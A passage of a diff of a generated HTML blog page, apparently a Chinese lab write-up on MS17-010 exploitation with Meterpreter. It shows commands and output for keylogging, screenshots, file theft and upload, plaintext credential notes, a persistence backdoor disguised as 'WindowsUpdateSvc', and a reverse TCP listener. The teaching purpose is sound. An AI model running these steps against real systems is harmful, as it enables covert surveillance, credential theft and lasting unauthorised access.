 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ankh-pc$ WORKGROUP &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ankh-pc$ WORKGROUP &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;PS：在Win7中，攻击者通常能够直接看到&lt;strong&gt;Password&lt;/strong&gt;一栏显示了明文密码，这是由于Win7默认将凭据存储在lsass进程内存中，且未加密。SYSTEM权限可以直接读取它。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;PS：在Win7中，攻击者通常能够直接看到&lt;strong&gt;Password&lt;/strong&gt;一栏显示了明文密码，这是由于Win7默认将凭据存储在lsass进程内存中，且未加密。SYSTEM权限可以直接读取它。&lt;/p&gt;
 &lt;h4 id="二隐私监控与取证monitoring"&gt;二、隐私监控与取证（Monitoring）
 &lt;/h4&gt;&lt;h5 id="1-实时屏幕截图"&gt;1. 实时屏幕截图
-&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/h5&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; screenshot
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Screenshot saved to: /root/ZuMWyRDh.jpeg
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Screenshot saved to: /root/ZuMWyRDh.jpeg&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png"
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png"
 width="860"
 height="618"
 srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_678321c30ae0e7d.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_7ac598bae94a8f45.png 1024w"
@@ -1593,6 +1813,15 @@ data-flex-basis="333px"
 &gt;&lt;/p&gt;
 &lt;h5 id="2-键盘记录keylogging"&gt;2. 键盘记录（Keylogging）
 &lt;/h5&gt;&lt;p&gt;如果当前是System权限则切换到用户权限 -&amp;gt; &lt;code&gt;keyscan_start # 开启键盘监听&lt;/code&gt; -&amp;gt; Ankh用户输入&lt;code&gt;Hello?&lt;/code&gt; -&amp;gt; &lt;code&gt;keyscan_dump # Kali屏幕输出记录下的按键&lt;/code&gt; -&amp;gt; &lt;code&gt;keyscan_stop # 停止监听&lt;/code&gt;&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -1798,12 +2027,23 @@ data-flex-basis="333px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_stop &lt;span class="c1"&gt;# 结束键盘嗅探&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Stopping the keystroke sniffer...
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;PS：切换到用户身份之后一般很难提升到SYSTEM权限（Windows安全机制），如果尝试&lt;code&gt;getsystem&lt;/code&gt;无果，则&lt;code&gt;background&lt;/code&gt; -&amp;gt; &lt;code&gt;run&lt;/code&gt;重新执行exploit&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;PS：切换到用户身份之后一般很难提升到SYSTEM权限（Windows安全机制），如果尝试&lt;code&gt;getsystem&lt;/code&gt;无果，则&lt;code&gt;background&lt;/code&gt; -&amp;gt; &lt;code&gt;run&lt;/code&gt;重新执行exploit&lt;/p&gt;
 &lt;h5 id="3-文件窃取与上传"&gt;3. 文件窃取与上传
 &lt;/h5&gt;&lt;p&gt;下载上一步中靶机桌面保存的&lt;code&gt;hello.txt&lt;/code&gt;文件并上传一个&lt;code&gt;hi.txt&lt;/code&gt;文件（可以是可执行的恶意程序）&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -1817,20 +2057,42 @@ data-flex-basis="333px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hello?meterpreter &amp;gt; download C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt;hello.txt /home/kali/Desktop &lt;span class="c1"&gt;# 把文件下载到Kali桌面&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Downloading: C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Downloaded 6.00 B of 6.00 B &lt;span class="o"&gt;(&lt;/span&gt;100.0%&lt;span class="o"&gt;)&lt;/span&gt;: C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Desktop&lt;span class="o"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Hi\!&amp;#34;&lt;/span&gt; &amp;gt; hi.txt &lt;span class="c1"&gt;# Kali终端创建文件&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Hi\!&amp;#34;&lt;/span&gt; &amp;gt; hi.txt &lt;span class="c1"&gt;# Kali终端创建文件&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
@@ -1839,14 +2101,25 @@ data-flex-basis="333px"
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; upload /home/kali/Desktop/hi.txt &amp;gt; C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="c1"&gt;# 上传文件&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id="三metasploit持久化后门攻击"&gt;三、Metasploit持久化后门攻击
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id="三metasploit持久化后门攻击"&gt;三、Metasploit持久化后门攻击
 &lt;/h4&gt;&lt;h5 id="利用windows服务机制实现权限维持"&gt;利用Windows服务机制实现权限维持
 &lt;/h5&gt;&lt;ol&gt;
 &lt;li&gt;Kali通过MS17-010漏洞获得靶机SYSTEM权限会话后，使用&lt;code&gt;persistence_service&lt;/code&gt;模块创建持久化后门&lt;/li&gt;
 &lt;/ol&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -1892,13 +2165,24 @@ data-flex-basis="333px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Creating service WindowsUpdateSvc
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ANKH-PC_20251231.0748/ANKH-PC_20251231.0748.rc
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;177734&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4446 -&amp;gt; 10.0.0.17:49159&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 09:07:49 +0000
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4446 -&amp;gt; 10.0.0.17:49159&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 09:07:49 +0000 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;PS：由于该模块创建了一个持久化服务并且立刻启动了该服务，因此该服务会主动向攻击机发起连接。因此启动该模块后立刻创建了一个新的会话（session 2）。两个会话的权限相同&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;PS：由于该模块创建了一个持久化服务并且立刻启动了该服务，因此该服务会主动向攻击机发起连接。因此启动该模块后立刻创建了一个新的会话（session 2）。两个会话的权限相同&lt;/p&gt;
 &lt;ol start="2"&gt;
 &lt;li&gt;创建监听器&lt;/li&gt;
 &lt;/ol&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -1936,12 +2220,23 @@ data-flex-basis="333px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit completed, but no session was created.
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4446
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;ol start="3"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ol start="3"&gt;
 &lt;li&gt;重启靶机&lt;/li&gt;
 &lt;/ol&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -1953,12 +2248,23 @@ data-flex-basis="333px"
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端1：（重启靶机，无需登录）原会话断开&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; closed. Reason: Died
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; closed. Reason: Died
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; closed. Reason: Died&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;ol start="4"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ol start="4"&gt;
 &lt;li&gt;靶机自动连接监听器&lt;/li&gt;
 &lt;/ol&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -2004,10 +2310,12 @@ data-flex-basis="333px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h5 id="相关原理"&gt;相关原理
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5 id="相关原理"&gt;相关原理
 &lt;/h5&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;持久化机制&lt;/strong&gt;：
 &lt;ul&gt;
@@ -2034,6 +2342,15 @@ data-flex-basis="333px"
 &lt;/ul&gt;
 &lt;h4 id="四shell"&gt;四、Shell
